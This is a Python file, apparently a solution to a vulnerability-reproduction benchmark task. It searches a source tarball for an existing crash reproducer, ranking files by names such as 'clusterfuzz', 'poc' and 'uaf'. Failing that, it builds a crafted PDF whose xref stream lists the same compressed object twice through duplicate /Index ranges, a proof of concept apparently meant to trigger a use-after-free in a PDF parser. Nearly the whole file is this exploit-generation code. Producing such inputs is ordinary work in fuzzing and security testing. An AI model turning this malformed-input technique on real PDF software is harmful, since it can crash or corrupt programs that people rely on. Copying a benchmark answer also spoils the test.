import io
import os
import re
import tarfile
import gzip
import bz2
import lzma
import base64
from typing import Optional, Iterable, Tuple


def _looks_like_pdf(data: bytes) -> bool:
    return data.startswith(b"%PDF-")


def _safe_decompress(data: bytes, max_out: int = 8 * 1024 * 1024) -> Optional[bytes]:
    try:
        if data.startswith(b"\x1f\x8b"):
            out = gzip.decompress(data)
            if len(out) <= max_out:
                return out
            return None
        if data.startswith(b"BZh"):
            out = bz2.decompress(data)
            if len(out) <= max_out:
                return out
            return None
        if data.startswith(b"\xfd7zXZ\x00"):
            out = lzma.decompress(data)
            if len(out) <= max_out:
                return out
            return None
    except Exception:
        return None
    return None


_B64_RE = re.compile(rb"^[A-Za-z0-9+/=\r\n\t ]{256,}$")


def _maybe_base64_decode(data: bytes, max_out: int = 8 * 1024 * 1024) -> Optional[bytes]:
    if not _B64_RE.match(data):
        return None
    try:
        stripped = b"".join(data.split())
        if len(stripped) % 4 != 0:
            return None
        out = base64.b64decode(stripped, validate=True)
        if len(out) <= max_out:
            return out
    except Exception:
        return None
    return None


def _try_extract_pdf_bytes(raw: bytes) -> Optional[bytes]:
    if _looks_like_pdf(raw):
        return raw

    dec = _safe_decompress(raw)
    if dec is not None and _looks_like_pdf(dec):
        return dec

    b64 = _maybe_base64_decode(raw)
    if b64 is not None:
        if _looks_like_pdf(b64):
            return b64
        dec2 = _safe_decompress(b64)
        if dec2 is not None and _looks_like_pdf(dec2):
            return dec2

    return None


def _read_member_limited(t: tarfile.TarFile, m: tarfile.TarInfo, max_bytes: int) -> Optional[bytes]:
    if not m.isreg():
        return None
    if m.size <= 0 or m.size > max_bytes:
        return None
    f = t.extractfile(m)
    if f is None:
        return None
    try:
        data = f.read(max_bytes + 1)
        if len(data) > max_bytes:
            return None
        return data
    finally:
        try:
            f.close()
        except Exception:
            pass


def _tar_members(t: tarfile.TarFile) -> Iterable[tarfile.TarInfo]:
    try:
        return t.getmembers()
    except Exception:
        return []


def _find_pdf_in_tarball(src_path: str) -> Optional[bytes]:
    if not os.path.exists(src_path):
        return None

    try:
        t = tarfile.open(src_path, mode="r:*")
    except Exception:
        return None

    try:
        members = list(_tar_members(t))
        if not members:
            return None

        # Pass 1: highly likely reproducer names
        pri_patterns = (
            "42535152",
            "clusterfuzz",
            "minimized",
            "repro",
            "poc",
            "crash",
            "uaf",
            "use-after-free",
            "use_after_free",
        )

        def name_score(n: str) -> int:
            nl = n.lower()
            score = 0
            for i, p in enumerate(pri_patterns):
                if p in nl:
                    score += 1000 - i * 20
            if nl.endswith(".pdf") or nl.endswith(".pdf.gz") or nl.endswith(".pdf.xz") or nl.endswith(".pdf.bz2"):
                score += 200
            if "/test/" in nl or "/tests/" in nl or "/fuzz" in nl or "/corpus" in nl or "/regression" in nl:
                score += 50
            score -= min(len(nl), 400) // 10
            return score

        cand = []
        for m in members:
            if not m.isreg():
                continue
            if m.size <= 0 or m.size > 5 * 1024 * 1024:
                continue
            n = m.name
            nl = n.lower()
            if any(p in nl for p in pri_patterns) or nl.endswith((".pdf", ".pdf.gz", ".pdf.xz", ".pdf.bz2", ".gz", ".xz", ".bz2")):
                cand.append((name_score(n), m))

        cand.sort(key=lambda x: -x[0])

        # Try prioritized candidates
        for _, m in cand[:200]:
            raw = _read_member_limited(t, m, 5 * 1024 * 1024)
            if not raw:
                continue
            pdf = _try_extract_pdf_bytes(raw)
            if pdf is not None:
                return pdf

        # Pass 2: scan for any PDF header quickly
        # Read only first 8 bytes to check magic, then full.
        for m in members:
            if not m.isreg():
                continue
            if m.size <= 8 or m.size > 2 * 1024 * 1024:
                continue
            f = t.extractfile(m)
            if f is None:
                continue
            try:
                head = f.read(8)
                if head.startswith(b"%PDF-"):
                    rest = f.read()
                    pdf = head + rest
                    return pdf
            except Exception:
                pass
            finally:
                try:
                    f.close()
                except Exception:
                    pass

        return None
    finally:
        try:
            t.close()
        except Exception:
            pass


def _build_poc_pdf() -> bytes:
    # Construct a PDF with an xref stream having duplicate /Index ranges for the same object id
    # and an object stream for at least one compressible object.
    buf = bytearray()
    offsets = {}

    def w(b: bytes) -> None:
        buf.extend(b)

    def add_obj(n: int, body: bytes) -> None:
        offsets[n] = len(buf)
        w(f"{n} 0 obj\n".encode("ascii"))
        w(body)
        if not body.endswith(b"\n"):
            w(b"\n")
        w(b"endobj\n")

    # Header
    w(b"%PDF-1.5\n%\xff\xff\xff\xff\n")

    # Object 1: Catalog
    add_obj(1, b"<< /Type /Catalog /Pages 2 0 R >>\n")

    # Object 2: Pages
    add_obj(2, b"<< /Type /Pages /Count 1 /Kids [3 0 R] >>\n")

    # Object 3: Page; Resources is compressed object 5 in object stream 4.
    add_obj(
        3,
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Resources 5 0 R /Contents 6 0 R >>\n",
    )

    # Object 4: Object stream containing object 5 only (resources dictionary)
    obj5 = (
        b"<< /ProcSet [/PDF /Text] "
        b"/Font << /F1 << /Type /Font /Subtype /Type1 /BaseFont /Helvetica >> >> >>"
    )
    header = b"5 0\n"
    first = len(header)
    objstm_data = header + obj5 + b"\n"
    objstm_dict = f"<< /Type /ObjStm /N 1 /First {first} /Length {len(objstm_data)} >>\n".encode("ascii")
    add_obj(4, objstm_dict + b"stream\n" + objstm_data + b"endstream\n")

    # Object 6: Content stream (uncompressed)
    content = b"BT /F1 12 Tf 10 10 Td (hi) Tj ET\n"
    add_obj(6, f"<< /Length {len(content)} >>\n".encode("ascii") + b"stream\n" + content + b"endstream\n")

    # Build xref stream object 7 with duplicate /Index including object 5 twice.
    # We'll include full range 0..7 (8 entries) and then range 5..5 (1 entry) -> total 9 entries in stream.
    xref_obj_num = 7
    offsets[xref_obj_num] = len(buf)

    def xref_entry(t: int, f2: int, f3: int) -> bytes:
        return bytes([t]) + int(f2).to_bytes(4, "big", signed=False) + int(f3).to_bytes(2, "big", signed=False)

    # Offsets for objects 1-6 and 4 are known; xref object offset also known now.
    off1 = offsets[1]
    off2 = offsets[2]
    off3 = offsets[3]
    off4 = offsets[4]
    off6 = offsets[6]
    off7 = offsets[7]

    entries = []
    # Range: 0..7
    entries.append(xref_entry(0, 0, 65535))       # obj 0 free
    entries.append(xref_entry(1, off1, 0))        # obj 1
    entries.append(xref_entry(1, off2, 0))        # obj 2
    entries.append(xref_entry(1, off3, 0))        # obj 3
    entries.append(xref_entry(1, off4, 0))        # obj 4
    entries.append(xref_entry(2, 4, 0))           # obj 5 compressed in objstm 4, index 0
    entries.append(xref_entry(1, off6, 0))        # obj 6
    entries.append(xref_entry(1, off7, 0))        # obj 7 (xref stream itself)
    # Duplicate range: 5 1 -> obj 5 again
    entries.append(xref_entry(2, 4, 0))           # obj 5 again

    xref_data = b"".join(entries)

    xref_dict = (
        b"<< /Type /XRef\n"
        b"/W [1 4 2]\n"
        b"/Index [0 8 5 1]\n"
        b"/Size 8\n"
        b"/Root 1 0 R\n"
        + f"/Length {len(xref_data)}\n".encode("ascii")
        + b">>\n"
    )

    w(f"{xref_obj_num} 0 obj\n".encode("ascii"))
    w(xref_dict)
    w(b"stream\n")
    w(xref_data)
    w(b"\nendstream\nendobj\n")

    startxref = offsets[7]
    w(b"startxref\n")
    w(f"{startxref}\n".encode("ascii"))
    w(b"%%EOF\n")

    return bytes(buf)


class Solution:
    def solve(self, src_path: str) -> bytes:
        pdf = _find_pdf_in_tarball(src_path)
        if pdf is not None:
            return pdf
        return _build_poc_pdf()